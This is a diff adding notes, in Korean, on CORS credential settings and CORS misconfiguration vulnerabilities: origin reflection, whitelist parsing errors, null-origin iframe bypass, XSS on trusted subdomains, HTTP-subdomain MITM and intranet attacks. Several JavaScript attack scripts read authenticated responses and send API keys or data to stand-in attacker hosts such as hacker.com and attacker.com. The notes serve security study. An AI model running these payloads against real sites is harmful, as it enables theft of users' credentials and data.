@@ -135,7 +135,10 @@ Access-Control-Max-Age: 240
 - `Access-Control-Allow-Methods`: 실제 요청에서 허용하는 메서드 목록
 - `Access-Control-Allow-Headers`: 실제 요청에서 허용하는 헤더 목록
 - `Access-Control-Allow-Credentials`: 인증 정보(쿠키, Authorization, TLS 클라이언트 인증서)를 포함한 요청을 허용할지
-
+	- 응답 값이 `true`여도 자동으로 쿠키가 포함되려면 설정을 해줘야함. 
+	- `fetch`: `credentials: 'include'` 설정을 추가해야함. 
+	- `XMLHttpRequest`: `xhr.withCredentials = true;` 설정을 추가해야함. 
+ 
 **흐름도** 
 ``` txt
 요청 발생 (fetch)
@@ -159,14 +162,182 @@ Access-Control-Max-Age: 240
                      → 허용 안 하면 실제 요청 안 보냄
 ```
 
-| 구분           | 단순 요청 (simple request)                           | non-simple 요청        |
-| ------------ | ------------------------------------------------ | -------------------- |
-| 메서드          | GET, HEAD, POST                                  | PUT, DELETE, PATCH 등 |
-| 헤더           | safelisted header만                               | 커스텀 헤더 포함            |
-| Content-Type | form-urlencoded, multipart/form-data, text/plain | application/json 등   |
-| HTML만으로 가능?  | 가능 (form, img 등)                                 | 불가능                  |
-| Preflight    | 없음                                               | 있음                   |
-| 요청 전송        | 바로 보냄                                            | OPTIONS 먼저           |
-| 응답 읽기        | CORS 헤더 필요                                       | CORS 헤더 필요           |
+
+### 취약점
+
+많은 웹 애플리케이션은 서브도메인 및 신뢰할 수 있는 제3자로부터 접근을 허용하기 위해 CORS를 사용함. 그러나 CORS 구현에 오류가 있거나 CORS 정책을 지나치게 관대하게 설계하면 취약점이 발생할 수 있음. 
+
+기존 요청에 Origin 헤더를 추가했을 때 응답에 Access-Control-Allow-Origin 헤더가 포함되어 있으면 해당 도메인을 허용하는 것임. 
+
+#### Origin 반사
+
+일부 애플리케이션은 cross-origin 요청에서 허용되는 도메인 목록을 유지하는 비용과 노력을 들이지 않기 위해 **클라이언트의 HTTP 요청 Origin 헤더를 기반**으로 Access-Control-Allow-Origin를 생성하고 응답에 포함함. 
+
+**예시**
+``` http 
+GET /sensitive-target-data HTTP/1.1
+Host: target.com
+Origin: https://hacker.com
+Cookie: sessionid=...
+```
+
+``` http 
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://hacker.com
+Access-Control-Allow-Credentials: true
+...
+```
+
+**공격 스크립트**
+해커의 웹사이트, 혹은 XSS를 통해서 주입한 스크립트를 피해자의 브라우저가 읽은 경우 공격이 성공함. 
+
+- `fetch`
+``` js
+fetch("https://target.com/accountDetails", {
+     credentials: "include",
+})
+    .then(response => response.json())
+    .then(result => location=`https://hacker.com?apikey=${result.apikey}`)
+```
+
+- `XMLHttpRequest`
+``` js
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://target.com/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/apikey='+this.responseText;
+    };
+</script>
+```
+
+
+#### Origin 헤더 파싱 오류
+
+일부 애플리케이션은 여러 출처에서 접근을 지원하기 위해 화이트리스트를 사용함.
+URL 접두사 또는 접미사를 일치하거나 정규 표현식을 사용하여 구현할 때 의도치 않은 외부 도메인에 대한 접근을 허용할 수 있음. 
+
+**예시**
+`normal-website.com`를 허용하는 경우 공격자 도메인
+- `hackersnormal-website.com`
+- `normal-website.com.evil-user.net` 
+
+
+#### null Origin 우회
+
+Origin 헤더에 null 값이 들어갈 수 있음. 
+- 리다이렉트 요청
+- `data:` URL, `blob:` URL 등 직렬화된 데이터가 나가는 요청
+- `file:` 프로토콜 요청
+- **샌드박스 방식의 교차 출처 요청**: `allow-same-origin`이 없는 `iframe`
+
+요청 
+``` http 
+GET /sensitive-victim-data
+Host: vulnerable-website.com
+Origin: null
+```
+
+응답: null Origin을 허용하는 서버
+``` http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+```
+
+공격 스크립트 
+``` html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+        src="data:text/html,<script>
+          fetch('https://target.com/sensitive-victim-data', {
+            credentials: 'include'
+          })
+          .then(res => res.text())
+          .then(data => {
+            location = 'https://hacker.com/log?key=' + encodeURIComponent(data);
+          });
+        </script>">
+</iframe>
+```
+- `<iframe sandbox=...>`에서 `allow-same-origin`를 설정하지 않으면 Origin에 null이 붙음. 
+
+
+#### XSS 공격 활용
+
+만약 애플리케이션이 신뢰하는 웹사이트가 XSS 취약점이 있다면 XSS를 이용해서 해당 출처에 CORS를 통해 데이터를 가져오는 스크립트를 삽입할 수 있음. 
+
+**예시** 
+애플리케이션이 `subdomain.vulnerable-website.com`를 신뢰하는데 해당 웹사이트에 XSS 취약점이 있는 경우
+``` url
+https://subdomain.vulnerable-website.com/?xss=<script>공격 스크립트</script>
+```
+
+
+#### HTTP 서브도메인 우회
+
+애플리케이션에서 HTTPS를 사용하지만 **신뢰할 수 있는 서브도메인에 HTTP를 허용하는 경우**
+공격자가 서브도메인에 대한 요청을 가로채서 가짜 응답을 줌으로써 피해자 브라우저가 가짜 페이지를 서브도메인의 결과로 인식하게 함. 가짜 페이지는 메인 사이트에 요청을 보낼때 Origin이 서브도메인으로 설정되고 민감한 데이터를 받아 유출 할 수 있음. 
+
+공격자가 **MITM(Man-in-the-Middle)** 를 활용해서 피해자와 서버 사이의 요청을 가로챌 수 있어야함. 
+- **같은 Wi-Fi**: 카페, 공항, 호텔
+- **악성 공유기**: 공격자가 설치한 Wi-Fi
+- **ISP(인터넷 제공자)** 레벨 가로채기
+- **ARP 스푸핑** 등 로컬 네트워크 공격
+
+**예시**
+메인 사이트 도메인: `https://target.com`
+메인 사이트가 CORS를 허용하는 서브 도메인: `http://subdomain.target.com`
+``` http 
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://subdomain.target.com
+Access-Control-Allow-Credentials: true
+```
+
+**공격 흐름**
+1. 피해자가 HTTP 요청을 보냄. 
+	- 리다이렉트 시키면 되기 때문에 `http://subdomain.target.com`가 아니라도 상관 없음. 
+
+2. 공격자가 리다이렉트 시킴: MITM 위치의 공격자가 피해자의 HTTP 트래픽을 가로채서 서브도메인으로 보냄. 
+``` http
+HTTP/1.1 302 Found
+Location: http://subdomain.target.com
+```
+
+3. 공격자가 가짜 응답을 반환: 피해자 브라우저가 `http://subdomain.target.com`으로 요청을 보내면 공격자가 그 요청을 가로채서 가짜 페이지를 반환함. 
+``` html
+<!-- 공격자가 위조한 페이지 -->
+<script>
+fetch('https://target.com/api/requestApiKey', {
+  credentials: 'include'
+})
+.then(res => res.text())
+.then(data => {
+  fetch('https://attacker.com/log?key=' + encodeURIComponent(data));
+});
+</script>
+```
+- **피해자 브라우저 입장에서 이 가짜 페이지는 `http://subdomain.target.com`에서 온 것으로 인식됨.** 
+
+4. 가짜 페이지가 메인 사이트에 CORS 요청: 가짜 페이지의 JS가 실행되면서 메인 사이트에 요청을 보내는데 Origin 주소가 `http://subdomain.target.com`으로 됨. 
+
+5. 메인 사이트가 CORS 허용: 메인 사이트 입장에서는 신뢰하는 서브 도메인에서 온 요청이기 때문에 정상적으로 응답을 주고 가짜 페이지에서는 그 응답 데이터를 탈취함. 
+
+
+#### 사내 웹사이트 공격
+
+대부분의 CORS 공격은 `Access-Control-Allow-Credentials: true` 응답 헤더가 있어야 가능한 것임. 해당 헤더가 없으면 사용자 브라우저의 쿠키를 보내지 않으므로 인증되지 않은 데이터만 접근이 가능함. 이 데이터들은 공격자가 직접 대상 웹사이트에 접속하여 얻을 수 있는 데이터와 동일한 것임. 즉, 공격의 의미가 없음. 
+
+그러나 쿠키를 보내지 않아도 공격이 의미가 있는 경우는 **사내 네트워크에 있는 웹사이트**에 접근할 때임.
+사내 웹사이트는 일반적으로 외부에서 접근이 불가하기 때문에 보통 외부 웹사이트보다 낮은 보안 수준으로 관리됨. 
+
+공격 흐름
+1. 내부 네트워크에 존재하는 피해자가 외부의 웹사이트를 방문함. (XSS 취약점이 있는 웹사이트나 공격자의 웹사이트)
+2. 내부 웹사이트로 요청을 보내는 악성 스크립트 실행
+	- 내부 웹사이트에서 받은 응답의 데이터를 공격자의 서버로 보내는 요청
+3. 피해자의 브라우저는 내부망에 있으므로 내부 웹사이트에 접근이 가능
 
 
